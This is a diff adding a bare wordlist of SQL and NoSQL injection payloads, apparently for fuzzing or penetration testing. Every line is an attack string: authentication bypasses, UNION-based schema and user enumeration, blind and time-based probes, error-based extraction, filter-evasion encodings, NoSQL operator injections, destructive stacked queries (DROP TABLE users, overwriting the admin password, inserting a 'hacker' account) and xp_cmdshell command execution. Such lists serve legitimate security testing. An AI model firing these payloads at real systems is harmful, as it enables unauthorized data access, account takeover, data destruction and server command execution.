@@ -1,0 +1,51 @@
+'
+''
+"
+""
+1'
+1"
+1' OR '1'='1
+1" OR "1"="1
+admin'--
+admin"--
+admin'#
+admin"#
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT user(),database(),version()--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns--
+1' AND '1'='1
+1' AND '1'='2
+1' AND (SELECT COUNT(*) FROM users)>0--
+1' AND (SELECT SUBSTRING(user(),1,1))='r'--
+1' AND ASCII(SUBSTRING(user(),1,1))=114--
+1'; WAITFOR DELAY '00:00:05'--
+1' AND SLEEP(5)--
+1' AND (SELECT COUNT(*) FROM users WHERE SLEEP(5))--
+1'; SELECT pg_sleep(5)--
+1' AND BENCHMARK(5000000,MD5(1))--
+1' AND EXTRACTVALUE(1,CONCAT(0x7e,user(),0x7e))--
+1' AND UPDATEXML(1,CONCAT(0x7e,user(),0x7e),1)--
+1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+{'$ne': ''}
+{'$gt': ''}
+{'$regex': '.*'}
+admin'; return true; var x='
+admin'; INSERT INTO users VALUES('hacker','password')--
+admin'; UPDATE users SET password='hacked' WHERE username='admin'--
+admin'; DROP TABLE users--
+1' AND LENGTH(user())=5--
+1' AND SUBSTR(user(),1,1)='r'--
+1' AND ORD(SUBSTR(user(),1,1))=114--
+1'/**/OR/**/1=1--
+1'%20OR%201=1--
+1'/*!50000OR*/1=1--
+1'%0aOR%0a1=1--
+1'||'1'='1
+1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x LIMIT 1)--
+1'; SELECT version()--
+1'; EXEC xp_cmdshell('whoami')--
+1' AND (SELECT user FROM dual)='SCOTT'--
